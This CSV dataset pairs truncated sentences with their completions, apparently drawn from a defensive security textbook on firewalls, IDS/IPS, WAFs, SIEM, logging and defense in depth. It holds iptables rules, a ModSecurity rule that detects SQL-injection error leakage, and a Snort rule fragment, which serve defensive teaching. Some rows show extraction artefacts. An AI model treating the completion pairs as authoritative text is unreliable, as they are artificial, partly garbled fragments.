sentence,answer
"also , you are thinking conceptually for what should be","also , you are thinking conceptually for what should be long-term rather than something specific to a point in time"
the standard starts down the path of how we get from statements of intent to,"the standard starts down the path of how we get from statements of intent to implementation , so we start to drill down from the high level of the policy"
there are sets of standards that provide guidance,there are sets of standards that provide guidance for organizations and are managed by standards bodies
the national institute of standards and technology ( nist ),"the national institute of standards and technology ( nist ) has a set of standards , documented in several special publications"
there are other standards documents that may be relevant to,"there are other standards documents that may be relevant to you , depending on where you are in the world"
the require- ments for each of those device types may,"the require- ments for each of those device types may be different , so the standards for them may be different"
"desktop systems may just be expected to take all updates as they come , with the expectation that any potential","desktop systems may just be expected to take all updates as they come , with the expectation that any potential outage could be remediated quickly on the off chance that there was an outage on a handful of users ’ desktops"
"servers , on the other hand , would be","servers , on the other hand , would be in place to service customers and possibly have revenue impacts"
"the standard , still focused on how to achieve the objective set out in the policy ,","the standard , still focused on how to achieve the objective set out in the policy , may say that there is a qual-ity assurance process that is necessary before patches may be deployed"
the service level agreement ( sla ) on those server,the service level agreement ( sla ) on those server systems may be completely different in terms of acceptable outages
"the standard for the server systems may be different from the desktop systems , but","the standard for the server systems may be different from the desktop systems , but both are written in service of the high-level policy that systems are kept up to date"
the standard would define anything that was vague ( what does “ up to,the standard would define anything that was vague ( what does “ up to date ” mean ? ) in the policy to make it relevant to operational staff
the standards are still high-level in the sense,the standards are still high-level in the sense of setting requirements for how policies should be implemented
"these provide guidance about how , specifically ,","these provide guidance about how , specifically , the standards are achieved at a very granular level"
"there may be multiple procedures for each standard , since","there may be multiple procedures for each standard , since there may be multiple organizations involved in imple-menting the standard"
you can see that with high-level guidance like that in a policy,"you can see that with high-level guidance like that in a policy , you likely wouldn ’ t have to touch it very often"
"policies are revisited on a regular basis , but the time scale for when the policies","policies are revisited on a regular basis , but the time scale for when the policies change would be measured in years , if the policies are well considered and well writ-ten"
as organizations in the company shift or responsibilities,"as organizations in the company shift or responsibilities shift , procedures will shift to accommodate them"
"additionally , a good procedure would have feedback loops built in","additionally , a good procedure would have feedback loops built in so the procedure could be regularly revised to be more efficient"
as we go through each layer from the top of the security program down to the very,"as we go through each layer from the top of the security program down to the very bottom , the result is more regular updates as we get to specific steps in implementation and administration"
"a guideline may provide information about best practices ,","a guideline may provide information about best practices , with the hope that the best practices may follow"
the best way to protect an enterprise is no longer about putting a firewall out in front of,"the best way to protect an enterprise is no longer about putting a firewall out in front of the network and considering yourself protected , even if that were ever the reality it was thought to be"
the assumption today is that prevention isn ’ t possible if,the assumption today is that prevention isn ’ t possible if the expectation is that 100 per- cent of attacks will be repelled
"just saying that a firewall is in place , though , doesn ’ t really","just saying that a firewall is in place , though , doesn ’ t really explain what is happening because there are several types of firewalls running up the network stack"
"the engine compartment is combustible , considering the","the engine compartment is combustible , considering the fuel , oxygen , and electricity mixture there"
car manufacturers put a fire-wall in to contain any fire that may,car manufacturers put a fire-wall in to contain any fire that may break out so it doesn ’ t spread to the passenger compart-ment
lots of devices offer the capability to filter packets,"lots of devices offer the capability to filter packets , which is sometimes accomplished with access control lists"
packet filters make determinations about the disposi-tion of,"packet filters make determinations about the disposi-tion of packets based on protocol , ports , and addresses"
"packets can be dropped , meaning they don ’ t get forwarded on to","packets can be dropped , meaning they don ’ t get forwarded on to the destination and there is also no response message sent to the originating system"
"they can also be rejected , meaning they won ’ t be sent to the destination but the rejecting device","they can also be rejected , meaning they won ’ t be sent to the destination but the rejecting device will send an internet control message protocol ( icmp ) error message to the sender indicating that the destination is unreachable"
"this is not only the polite approach , since drops will incur retransmits","this is not only the polite approach , since drops will incur retransmits , it ’ s also generally considered the correct approach from the protocol standpoint"
"a default deny policy , the most secure way to implement a","a default deny policy , the most secure way to implement a packet filter , will drop everything that isn ’ t explicitly allowed through"
"you may also have a default accept policy , which","you may also have a default accept policy , which means everything is allowed through unless something is explicitly blocked"
while the host-based firewall included in most linux distributions has other,"while the host-based firewall included in most linux distributions has other capabilities , it can also function as a basic packet filter"
"as an example , the following lines show running iptables to set a default deny policy on the","as an example , the following lines show running iptables to set a default deny policy on the input , output , and forward chains , which are collections of rules applied to specific message flows"
iptables policy settings iptables -p input drop iptables -p output dropiptables,iptables policy settings iptables -p input drop iptables -p output dropiptables -p forward drop packet filtering is very basic in its functionality
"while these packet filters can be good for inbound traffic or even for keeping internal users from accessing specific ports or ip addresses , they are","while these packet filters can be good for inbound traffic or even for keeping internal users from accessing specific ports or ip addresses , they are not good for more complex filtering , such as allowing inbound traffic that is a response to messages that originated on the inside of the network"
"for this , we need to keep track of those outbound","for this , we need to keep track of those outbound connections , so we need something more than just a packet filter"
stateful filtering not long after the initial development,stateful filtering not long after the initial development of packet filters came the development of stateful firewalls
these are firewall types we should know well because they,these are firewall types we should know well because they have been around for about three decades at this point
this means the firewall has to have a state table so,this means the firewall has to have a state table so it knows about all of the traffic flows passing through it
"in the case of the transmission control protocol ( tcp ) , it ’ s theoretically","in the case of the transmission control protocol ( tcp ) , it ’ s theoretically easier since the flags tell the story when it comes to the state of the traffic flow"
"as an example , the file transfer protocol ( ftp ) will sometimes originate","as an example , the file transfer protocol ( ftp ) will sometimes originate connections from the inside to the outside , mean-ing from the server to the client"
"in this case , the server to client connection for transferring the","in this case , the server to client connection for transferring the file is related to the control connection from the client to the server"
they watch messages coming in and going out and note them,they watch messages coming in and going out and note them along with their directionality in order to determine what the state is
"when you have a stateful firewall , you can not only make decisions based on","when you have a stateful firewall , you can not only make decisions based on the ports and addresses , you can also add in the state of a connection"
"for example , you can see a pair of iptables rules in the following code listing that allow all","for example , you can see a pair of iptables rules in the following code listing that allow all connections that are new or established into port 22 , which is the secure shell ( ssh ) port"
"iptables state rules iptables -a input -i eth0 -p tcp -- dport 22 -m state -- state \ new , established -j acceptiptables -a output -o eth0 -p tcp --","iptables state rules iptables -a input -i eth0 -p tcp -- dport 22 -m state -- state \ new , established -j acceptiptables -a output -o eth0 -p tcp -- sport 22 -m state -- state established \-j accept this gets us a little further in our capabilities to make decisions about what packets to allow or deny into our networks"
"while it doesn ’ t seem like a lot , these","while it doesn ’ t seem like a lot , these capabilities provide a lot of potential for keeping bad people out"
deep packet inspection one of the biggest issues when it,deep packet inspection one of the biggest issues when it comes to firewalls is that they allow known services through
attack traffic that uses the application against itself,attack traffic that uses the application against itself will set up connections just like any other client
"just looking at the protocol headers is insufficient ,","just looking at the protocol headers is insufficient , because everything will look correct and legal in the headers"
a deep packet inspection ( dpi ) firewall looks,a deep packet inspection ( dpi ) firewall looks beyond the headers and into the payload of the packet
a dpi firewall would require signatures that it should look for in the packet to determine whether,a dpi firewall would require signatures that it should look for in the packet to determine whether something is going to be malicious so it can block the traffic from coming into the network
"in order to do this , the firewall has to","in order to do this , the firewall has to parse the entire message before it can make any determinations"
"this means it has to have at least the entire packet ,","this means it has to have at least the entire packet , meaning any fragmentation at the ip layer has to arrive and be reassembled"
any message that doesn ’ t have the entire set of ip and tcp/ udp,"any message that doesn ’ t have the entire set of ip and tcp/ udp headers is likely a problem anyway , since that ’ s well under 100 bytes"
fragmenting a message at under 100 bytes could be a result of,"fragmenting a message at under 100 bytes could be a result of malicious traffic , trying to fool a firewall or other security solution"
"only looking at the headers is limiting , though , especially","only looking at the headers is limiting , though , especially since so many attacks today come in over the higher-layer protocols"
any man in the middle approach to encryption on the part of,any man in the middle approach to encryption on the part of the firewall violates the end-to-end expectation of most encryption solutions and users
"this means that with the move to encryption over all web-based connections ,","this means that with the move to encryption over all web-based connections , dpi fire-walls don ’ t do a lot to protect the web server"
"for example , in voice over ip ( voip ) networks ,","for example , in voice over ip ( voip ) networks , a device called a session border controller ( sbc ) can be used"
"as such , it can not only make determinations about the validity of the messaging but also open up dynamic pinholes to allow the","as such , it can not only make determinations about the validity of the messaging but also open up dynamic pinholes to allow the real-time transport protocol ( rtp ) media messages through , since they would be over different ports and protocols than the signaling messages would be"
"an sbc would be an example of an application layer firewall ,","an sbc would be an example of an application layer firewall , since it has the capabil- ity of making decisions about allowing traffic through"
it makes these decisions based on understanding the application,it makes these decisions based on understanding the application layer protocol and common state flows of that protocol
"while there are sev-eral commercial wafs , there is also modsecurity ,","while there are sev-eral commercial wafs , there is also modsecurity , which is an open-source module that can be used with apache web servers"
mod-security rule secrule response_body `` @ rx ( ? i ) ( ? : supplied argument is not a valid mysql|column count does n't match value count at row|mysql_fetch_array\ ( \ ) |on mysql result index|you have an error in your,mod-security rule secrule response_body `` @ rx ( ? i ) ( ? : supplied argument is not a valid mysql|column count does n't match value count at row|mysql_fetch_array\ ( \ ) |on mysql result index|you have an error in your sql syntax ; |you have an error in your sql syntax near|mysql server version for the right syntax to use|\ [ mysql\ ] \ [ odbc|column count does n't match|table ' [ ^ ' ] + ' does n't exist|sql syntax
"if the rule matches , the regular expression match will be","if the rule matches , the regular expression match will be placed into the transaction variable collection because of the capture action"
"in addition to capturing information , which can be logged and referred to","in addition to capturing information , which can be logged and referred to later or be used for alerting , modsecurity can block as an action"
"sometimes , a waf like modsecurity is implemented on the edge of the network as a reverse proxy , so clients send messages to the reverse proxy","sometimes , a waf like modsecurity is implemented on the edge of the network as a reverse proxy , so clients send messages to the reverse proxy , which handles the message on behalf of the server , parsing it for potential bad requests , before sending it on to the actual web server"
any device that can make decisions based on what is happening in the application layer protocol and then have the,"any device that can make decisions based on what is happening in the application layer protocol and then have the ability to drop the message , regardless of the application layer protocol , could be considered an application layer firewall"
"users are often the most vulnerable point on your network ,","users are often the most vulnerable point on your network , and they are regularly targets of social engineering and malware attacks"
a unified threat management ( utm ) device is one that consolidates a lot of security,a unified threat management ( utm ) device is one that consolidates a lot of security functions into a single system that may be placed at a single point in the network
"this utm would replace the firewall , intrusion detection ,","this utm would replace the firewall , intrusion detection , and intrusion protection devices as well as offering antivirus protection"
"if your firewall failed , for instance , you would still have intrusion","if your firewall failed , for instance , you would still have intrusion detection systems to catch anything that got through , if that had happened"
"with utm , you have one place and it needs to","with utm , you have one place and it needs to work all the time and be configured correctly all the time"
intrusion detection systems there are two different types,intrusion detection systems there are two different types of intrusion detection systems idss that you can find
one of the challenges with a host-based ids is that once an attacker is in a position to trig-ger a host-based ids,"one of the challenges with a host-based ids is that once an attacker is in a position to trig-ger a host-based ids , they are on the system , which means they can become aware that the ids is in place and make plans accordingly"
"where firewalls have the ability to block or allow packets in the network stream ,","where firewalls have the ability to block or allow packets in the network stream , a network ids can take some of the same sorts of rules and generate log messages"
as long as you can create some sort of identification for the messages you,"as long as you can create some sort of identification for the messages you want to log or alert on , you can write a rule for an ids"
"there are also some open-source options , one of the biggest names being snort , which is","there are also some open-source options , one of the biggest names being snort , which is currently owned by cisco , but free access to the program and some community rules is still offered"
one of these approaches is to place the ids connected in parallel rather than in series,one of these approaches is to place the ids connected in parallel rather than in series at the very perimeter of the network so all net-work traffic coming in can be observed
"3 shows a simplified diagram using this approach , with the","3 shows a simplified diagram using this approach , with the ids behind the firewall but not in the traffic flow directly"
traffic gets shunted to the ids so it can detect,traffic gets shunted to the ids so it can detect without getting in the way or causing a network failure
another approach is to place sensors in different parts of,another approach is to place sensors in different parts of the network so you don ’ t have a single device
this isn ’ t the case any longer because process-ing power,"this isn ’ t the case any longer because process-ing power has increased considerably , as has overall bus throughput in systems"
"even so , using multiple sensors across different parts","even so , using multiple sensors across different parts of the network can allow for sharing the processing load"
"just as with waf rules , it takes some time and effort to understand how to write","just as with waf rules , it takes some time and effort to understand how to write rules , espe-cially in cases where what you are trying to detect on is content in the packets"
"in the fol-lowing code listing , you will see two","in the fol-lowing code listing , you will see two snort rules that demonstrate some of what snort can do"
com/advisories/high-risk-vulnerability-in- ingres-stack-overflow ; classtype : attempted-admin ; sid:12027 ;,com/advisories/high-risk-vulnerability-in- ingres-stack-overflow ; classtype : attempted-admin ; sid:12027 ; rev:11 ; ) snort rules start with an action
"you can alert , as is done in both of these rules","you can alert , as is done in both of these rules , which generates an alert message to whatever is configured for output"
"some of these capabilities take us beyond traditional ids functionality ,","some of these capabilities take us beyond traditional ids functionality , but they are actions that snort can take in rule configurations"
"in our case , we are alerting on a tcp message , so we need","in our case , we are alerting on a tcp message , so we need to specify not only a source and destination address but also a source and desti-nation port"
snort is aware of which side is the cli-ent and which is the,"snort is aware of which side is the cli-ent and which is the server , so you can indicate which side the message should come from"
"the important part comes next , where we specify","the important part comes next , where we specify what the packet should contain to match on this rule"
"while this is configurable , there are conventions","while this is configurable , there are conventions about numbers that should be used for user-defined rules"
the alert assumes that someone is paying attention to what the ids,the alert assumes that someone is paying attention to what the ids is emitting and taking actions based on the alert and a subsequent investigation
snort monitors network traffic and parses through it to identify packets,"snort monitors network traffic and parses through it to identify packets that contain possibly malicious contents , as identified by the rules"
"in order to have snort run as an ips , it has to be placed inline ,","in order to have snort run as an ips , it has to be placed inline , meaning it has to be a device in the path of traffic into and out of the network"
any ips would have to be similarly configured in,any ips would have to be similarly configured in order to have the ability to block any network traffic
the difference between an ips and a firewall is that,the difference between an ips and a firewall is that the “ firewall rules ” on an ips would be dynamic
"rather than having large blanket rules blocking ip addresses wholesale ,","rather than having large blanket rules blocking ip addresses wholesale , the ips would make decisions based on the contents of the packet"
the rule would be in place for the duration,the rule would be in place for the duration of the packet passing through the ips—essentially a one-off
"the rule may just exist to handle that one packet , or it may be","the rule may just exist to handle that one packet , or it may be in use for a longer period , but the rules are dynamic and temporary by nature"
"also while inline , either the ips can choose to drop the message ,","also while inline , either the ips can choose to drop the message , meaning just discard it , or it can reject it with an appropriate message"
"in several cases of running a basic snort installation with the community rules , i have run across","in several cases of running a basic snort installation with the community rules , i have run across alerts indicating bad sip messages , when in fact the traffic was http over port 80 , not sip"
"rules are not infallible , so it is possible for rules to catch legitimate traffic , and","rules are not infallible , so it is possible for rules to catch legitimate traffic , and if you are running an ips , you may end up blocking messages from customers or partners"
"this is a factor of the number of rules you have , how well they are written ,","this is a factor of the number of rules you have , how well they are written , and how much traffic you get into your network , as well as the placement of your sensors"
"alerting is a significant challenge , and it can require a lot of work to fine-tune rules so your analysts , or whoever is looking at the alerts , don ’ t","alerting is a significant challenge , and it can require a lot of work to fine-tune rules so your analysts , or whoever is looking at the alerts , don ’ t become screen-blind , meaning they get so used to seeing the same alerts over and over that they end up missing one that is legitimate—a white rabbit in a field of white snow/noise"
security information and event management a good practice from the,security information and event management a good practice from the standpoint of both system administration and security is system logging
if you ’ ve ever had to troubleshoot a system or application that has failed,"if you ’ ve ever had to troubleshoot a system or application that has failed without having any logs to look at , you will understand the value of logs"
"they also consume pro-cessing power , and more logging can actually make it harder to find problems because","they also consume pro-cessing power , and more logging can actually make it harder to find problems because you ’ re having to wade through enormous volumes of text to find one entry that will help you"
"in the case of security inci- dents , these","in the case of security inci- dents , these log management systems can also include search and correlation tools"
"while there are many log management solutions , many organizations are","while there are many log management solutions , many organizations are moving to something called security information and event management ( siem )"
5 kibana interface to the elastic stack the elastic stack is,5 kibana interface to the elastic stack the elastic stack is a good platform to ingest large amounts of data from multiple sources
5 is a listing of the dns responses that have,5 is a listing of the dns responses that have been seen by the systems reporting to this elastic stack installation
it will also provide a large number of visualization options,it will also provide a large number of visualization options based on the data that is being provided to it
"a security operations center ( soc ) will often be built around monitoring systems , including","a security operations center ( soc ) will often be built around monitoring systems , including a siem system that can be used to correlate data from a number of different sources"
the advantage to using siem is being able to pull a lot of data,the advantage to using siem is being able to pull a lot of data together so you can get a broader picture of what is happening across the network
seeing an attack in isolation may get you to focus on the one attack you are,"seeing an attack in isolation may get you to focus on the one attack you are looking at , rather than recognizing that there are several other systems that are also being attacked"
having data points can help to ensure that the,having data points can help to ensure that the right controls are in place to protect information assets
"it ’ s been said that the only secure computer ( and , by extension , network ) is one that","it ’ s been said that the only secure computer ( and , by extension , network ) is one that has had all of the cables cut and , ideally , filled with cement and dropped to the bottom of the ocean"
"if you want to do anything with a computer , you are","if you want to do anything with a computer , you are exposing your-self to the potential for that computer to become infected or compromised"
implementing security solutions requires understanding where your,implementing security solutions requires understanding where your resources are—this is not only information assets
you can take care of the technology aspects with,you can take care of the technology aspects with a defense in depth approach to security design and architecture
"as mentioned earlier , having logs is really","as mentioned earlier , having logs is really important when it comes to responding to security events"
"if an invader somehow man-ages to breach one of the walls , the people fall back","if an invader somehow man-ages to breach one of the walls , the people fall back into the next ring until , if necessary , they end up inside the final wall"
"hopefully , invaders will either give up or be defeated","hopefully , invaders will either give up or be defeated as they try to make it through seven enormous walls"
"as discovered in the book return of the king , though ,","as discovered in the book return of the king , though , even seven walls aren ’ t always sufficient for defense of the city"
"the reason minas tirith comes to mind , in case it ’ s","the reason minas tirith comes to mind , in case it ’ s not clear , is because it ’ s an example of defense in depth"
"using a defense in depth approach , you would design a","using a defense in depth approach , you would design a layered network with multiple security gateways to control access between layers"
"when a defense in depth strategy is used , as an","when a defense in depth strategy is used , as an adversary moves through the layers of the network , they leave traces"
"the hope is the detection happens , leading to shutting down","the hope is the detection happens , leading to shutting down the attack , before the adversary gets to any really sensitive information"
this doesn ’ t necessarily mean that you just,this doesn ’ t necessarily mean that you just keep placing the same controls back to back every-where
"anyone with physical access to a system has the potential to get logged into the system—as an example , there may","anyone with physical access to a system has the potential to get logged into the system—as an example , there may already be a user logged in and if the system isn ’ t locked , anyone could become the logged in user"
"this is what i ’ ve been talking about—firewalls ,","this is what i ’ ve been talking about—firewalls , intrusion detection systems , siems , and other security technology"
any hard - ware or software that is in,any hard - ware or software that is in place to prevent unauthorized use would be a technical control
this may include policies or practices like hiring,"this may include policies or practices like hiring standards , background checks , and data handling policies"
these administrative controls set the tone for how,"these administrative controls set the tone for how the organization is protected , and they are essential"
"the first is a demilitarized zone , which is where servers","the first is a demilitarized zone , which is where servers that are untrusted but still part of the corporate network reside"
the other side of the firewall is where you,the other side of the firewall is where you might put internal servers like active directory or file serv-ers
6 defense in depth network design dmz desktop networkinternal serversexternal firewall internal firewall intrusion detection systemintrusion detection system,6 defense in depth network design dmz desktop networkinternal serversexternal firewall internal firewall intrusion detection systemintrusion detection system desktop with endpoint protection a second firewall protects the internal network from the server network and vice versa
"of course , there is more to it than even just","of course , there is more to it than even just the network design , the technology , and the policies and procedures"
"defense in breadth for several years now , there has been something of a","defense in breadth for several years now , there has been something of a debate between the advantages of defense in depth versus those of defense in breadth"
is defense in depth sufficient or do organizations need to be implementing defense in breadth ?,"is defense in depth sufficient or do organizations need to be implementing defense in breadth ? of course , the challenge to defense in breadth is that it is rarely explained very well"
"if you search for explanations of defense in breadth , you will find a lot of rationale for why defense in breadth is a","if you search for explanations of defense in breadth , you will find a lot of rationale for why defense in breadth is a good thing and why defense in depth in and of itself is insufficient for a modern strategy to implement security solutions within an organization"
my understanding of defense in breadth over the years has been that,my understanding of defense in breadth over the years has been that it ’ s all the surround that is missing from defense in depth
the organization is meant to evaluate risk and take a systemic look at how to mitigate,"the organization is meant to evaluate risk and take a systemic look at how to mitigate any risk , taking into account the threats that the organization expects to be exposed to"
in order to fully evaluate risk and take a comprehensive,"in order to fully evaluate risk and take a comprehensive look at potential solutions , an organization needs to have data"
this is especially true in an era where the old technical attacks of exploiting vulnerabilities,this is especially true in an era where the old technical attacks of exploiting vulnerabilities in listening services exposed to the outside world are no longer the vectors of choice
"instead , going after the user is more productive , so","instead , going after the user is more productive , so social engineering attacks and a lot of malware are more common"
"as a result , the best approach to security is not to focus primarily on prevention","as a result , the best approach to security is not to focus primarily on prevention but instead , assume that you will get breached at some point and prepare for response"
the members of the security team are not always the best people to,"the members of the security team are not always the best people to respond to events , especially since they may not always be aware of them"
a growing trend in the information technology ( it ) space is the,"a growing trend in the information technology ( it ) space is the collaboration between development teams and operations teams , commonly referred to as devops"
companies that are even more forward-thinking are also,companies that are even more forward-thinking are also ensuring that security is merged in along the way
these approaches focus not only on teamwork and the,these approaches focus not only on teamwork and the associated communication that is necessary but also on automation
"automating builds , testing , and deployment takes a lot of","automating builds , testing , and deployment takes a lot of the human factor out , helping to avoid misconfigurations or other mistakes"
you can see that defense in breadth can be a very complicated idea that may be difficult,you can see that defense in breadth can be a very complicated idea that may be difficult to fully implement once you start thinking about where you can inject security conversa-tions into your organization
"ultimately , though , the goal of defense in breadth is to be better positioned to not only protect the organization","ultimately , though , the goal of defense in breadth is to be better positioned to not only protect the organization but also respond to attacks—also , to respond to a breach with the goal of restoring business operations as quickly as possible"
"beyond that , it ’ s not just logging on systems—desktop or","beyond that , it ’ s not just logging on systems—desktop or server—but also on network equipment like routers and switches and certainly firewalls"
"even in cases where you are running an ids in the network , you may not always want to","even in cases where you are running an ids in the network , you may not always want to alert , because there may be some events that you don ’ t feel it necessary to follow up on"
"many systems , including unix-like systems as well","many systems , including unix-like systems as well as network devices , will support the syslog protocol"
this is a logging protocol that began as the logging mechanism,this is a logging protocol that began as the logging mechanism for the simple mail transfer protocol ( smtp ) server sendmail
"over the years since the 1980s , when syslog was first implemented in sendmail , it has become the standard","over the years since the 1980s , when syslog was first implemented in sendmail , it has become the standard logging solution on unix-like systems , and the protocol has been documented in rfc 3164 , later standard-ized in rfc 5424"
syslog not only has an easy-to-understand syntax in the creation and reading of messages,"syslog not only has an easy-to-understand syntax in the creation and reading of messages , it also can be used for remote logging as well as local logging"
"any attacker who gets access to a system may be able to wipe the local logs , but if they are","any attacker who gets access to a system may be able to wipe the local logs , but if they are streaming off the system , they are retained for later use , unless the attacker can compromise the central log host"
"any messages related to authentication , for example , can be","any messages related to authentication , for example , can be put into a single file , away from other types of messages"
each facility can be routed to a different file or even a different,"each facility can be routed to a different file or even a different system , if you wanted some log messages stored locally and others stored centrally"
this means applications can determine the level of an event,"this means applications can determine the level of an event , including informational , debug , warning , and error"
instead of the text-based messages that syslog uses,"instead of the text-based messages that syslog uses , the event subsystem uses a binary storage system"
"of course , one advantage of the way the event subsystem stores data","of course , one advantage of the way the event subsystem stores data is that it can be queried , as though it were a database"
"while it ’ s not as easy to parse mes-sages , the fact that","while it ’ s not as easy to parse mes-sages , the fact that you can query messages means you can easily return related messages with a single query"
"in addition to the differ - ent categories , such as","in addition to the differ - ent categories , such as system , security , and application , there are event ids"
searching for the event id can give you every instance,"searching for the event id can give you every instance of a particular event , which may occur across multiple processes"
"7 event viewer in both cases , application developers","7 event viewer in both cases , application developers can make use of the system-provided logging func - tionality"
"on the unix side , any developer can write to syslog and the syslog service","on the unix side , any developer can write to syslog and the syslog service will take care of writing the logs out based on the definition in the configuration file"
this takes the onus of developing logging schemes off the developers,this takes the onus of developing logging schemes off the developers and also ensures a single place to go for log messages
the application can even have its own log file,the application can even have its own log file and windows will break the logs out to separate locations
"if you were to go into the event viewer application , you would be able to","if you were to go into the event viewer application , you would be able to look at all the event log entries and the different categories the event logs fell into"
any application could have its own entry in that list to keep the logs separate from,any application could have its own entry in that list to keep the logs separate from the system while it ’ s still logged to the same location as all the other logs
"auditing logs are important , and we generally rely on application developers to implement","auditing logs are important , and we generally rely on application developers to implement logging and , ideally , configurable logging , meaning different levels of log messages"
"if the audit events are triggered , they will show","if the audit events are triggered , they will show up in the security log in the windows event viewer"
8 audit policy in windows on the linux,"8 audit policy in windows on the linux side , there is a completely different auditing infrastructure"
763:341 ) : pid=9711 uid=0 auid=0 ses=30,763:341 ) : pid=9711 uid=0 auid=0 ses=30 msg='op=login id=0 exe= '' /usr/sbin/sshd '' hostname=binkley
765:342 ) : pid=9711 uid=0 auid=0 ses=30,765:342 ) : pid=9711 uid=0 auid=0 ses=30 msg='op=login id=0 exe= '' /usr/sbin/sshd '' hostname=binkley
424:353 ) : auid=4294967295 ses=4294967295 op=add_rule key= (,424:353 ) : auid=4294967295 ses=4294967295 op=add_rule key= ( null ) list=4 res=1 type=service_start msg=audit ( 1530130271
424:354 ) : pid=1 uid=0 auid=4294967295 ses=4294967295 msg='unit=auditd comm= '' systemd '' exe= '',424:354 ) : pid=1 uid=0 auid=4294967295 ses=4294967295 msg='unit=auditd comm= '' systemd '' exe= '' /usr/lib/systemd/systemd '' hostname= ? addr= ? terminal= ? res=success ' type=syscall msg=audit ( 1530130283
962:355 ) : arch=c000003e syscall=59 success=yes exit=0 a0=106e000 a1=1063a90 a2=10637e0 a3=7ffec3721e70 items=2 ppid=9711 pid=9908 auid=0 uid=0 gid=0 euid=0 suid=0 fsuid=0,962:355 ) : arch=c000003e syscall=59 success=yes exit=0 a0=106e000 a1=1063a90 a2=10637e0 a3=7ffec3721e70 items=2 ppid=9711 pid=9908 auid=0 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts0 ses=30 comm= '' cat '' exe= '' /usr/bin/cat '' key= ( null ) type=execve msg=audit ( 1530130283
962:355 ) : item=0 name= '' /usr/bin/cat '' inode=2799 dev=fd:00 mode=0100755,962:355 ) : item=0 name= '' /usr/bin/cat '' inode=2799 dev=fd:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 objtype=normal cap_fp=0000000000000000 cap_fi=0000000000000000 cap_fe=0 cap_fver=0 type=path msg=audit ( 1530130283
2 '' inode=33559249 dev=fd:00 mode=0100755 ouid=0 ogid=0 rdev=00:00,2 '' inode=33559249 dev=fd:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 objtype=normal cap_fp=0000000000000000 cap_fi=0000000000000000 cap_fe=0 cap_fver=0 type=proctitle msg=audit ( 1530130283
962:355 ) : proctitle=6361740061756469742e6 c6f67 each entry provides details about the type,"962:355 ) : proctitle=6361740061756469742e6 c6f67 each entry provides details about the type of the entry , which indicates what the audit subsystem has detected"
you can make the changes directly in the configuration files or you,you can make the changes directly in the configuration files or you can add the rules on the command line using the auditctl command
what go into the configuration file are the,what go into the configuration file are the command-line parameters that would get passed to auditctl
the first are the three elemental properties,"the first are the three elemental properties of information security—confidentiality , integ-rity , and availability"
"finally , availabil-ity means information , including services ,","finally , availabil-ity means information , including services , is available when it is expected to be available"
"beyond the triad , as confidentiality , integrity , and availability are known , is","beyond the triad , as confidentiality , integrity , and availability are known , is the parkerian hexad , which adds in utility , authenticity , and possession or control"
stateful firewalls factor in the state of the connection,stateful firewalls factor in the state of the connection when it comes to deci-sions about allowing or blocking traffic
"finally , unified threat management devices , which some call next-generation firewalls ,","finally , unified threat management devices , which some call next-generation firewalls , can take firewall functionality to a new level by also adding in antivirus"
the antivirus looks at the network stream for malware,the antivirus looks at the network stream for malware rather than waiting until it gets to the endpoint
these are devices that are aware of the application layer protocols and can make decisions about the packets,these are devices that are aware of the application layer protocols and can make decisions about the packets based on whether the traffic matches to allowed endpoints and whether the flow is correct based on the protocol
a defense in depth strategy applies layers not only to the placement of the technology but,"a defense in depth strategy applies layers not only to the placement of the technology but also to the policies , procedures , and standards that are required to guide the security functions"
defense in breadth adds in a broader view to defense,defense in breadth adds in a broader view to defense in depth with a lot of additional surround across the organization
"this may include awareness training , detection , preparation for","this may include awareness training , detection , preparation for response , and other capabilities that are beyond just preventing attacks"
